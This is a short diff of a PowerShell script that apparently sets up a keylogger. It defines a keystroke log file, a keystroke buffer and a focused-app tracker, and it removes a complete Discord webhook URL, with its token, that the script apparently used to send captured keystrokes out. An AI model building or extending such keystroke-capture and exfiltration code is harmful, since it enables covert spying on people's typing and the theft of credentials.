@@ -1,6 +1,6 @@
 # Define the log file and Discord webhook URL
 $logFile = "C:\key_log.txt"
-$discordWebhookUrl = "https://discord.com/api/webhooks/1281143685895159809/FnbUZFSOnixzoac78xUQuXJ7qve5OoH1jZ8ejA7zDPUbqb1LX-7ltk0adeRzUYq0H0Un"
+$discordWebhookUrl = ""
 $keystrokeBuffer = ""
 $currentFocusedApp = ""
 
